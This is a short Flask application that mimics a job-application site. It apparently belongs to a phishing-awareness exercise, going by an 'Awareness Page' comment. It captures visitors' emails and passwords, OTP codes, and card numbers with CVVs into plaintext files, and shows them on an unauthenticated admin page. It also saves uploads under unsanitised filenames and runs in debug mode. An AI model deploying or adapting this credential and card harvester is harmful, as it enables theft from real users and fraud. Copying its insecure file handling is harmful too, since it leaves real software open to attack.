from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'

# Home Page
@app.route('/')
def home():
    return render_template('index.html')

# Login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        with open("credentials.txt", "a") as f:
            f.write(f"{email} | {password}\n")

        return redirect('/upload')

    return render_template('login.html')

# Upload Resume
@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        file = request.files['resume']
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))

        return redirect('/otp')

    return render_template('upload.html')

# OTP Page
@app.route('/otp', methods=['GET', 'POST'])
def otp():
    if request.method == 'POST':
        otp = request.form['otp']

        with open("otp.txt", "a") as f:
            f.write(f"{otp}\n")

        return redirect('/payment')

    return render_template('otp.html')

# Payment
@app.route('/payment')
def payment():
    return render_template('payment.html')

@app.route('/pay', methods=['POST'])
def pay():
    card = request.form['card']
    cvv = request.form['cvv']

    with open("payments.txt", "a") as f:
        f.write(f"{card} | {cvv}\n")

    return redirect('/success')

# Awareness Page
@app.route('/success')
def success():
    return render_template('success.html')

# Admin Panel
@app.route('/admin')
def admin():
    creds = open("credentials.txt").read()
    payments = open("payments.txt").read()
    otps = open("otp.txt").read()

    return render_template('admin.html', creds=creds, payments=payments, otps=otps)

if __name__ == '__main__':
    app.run(debug=True)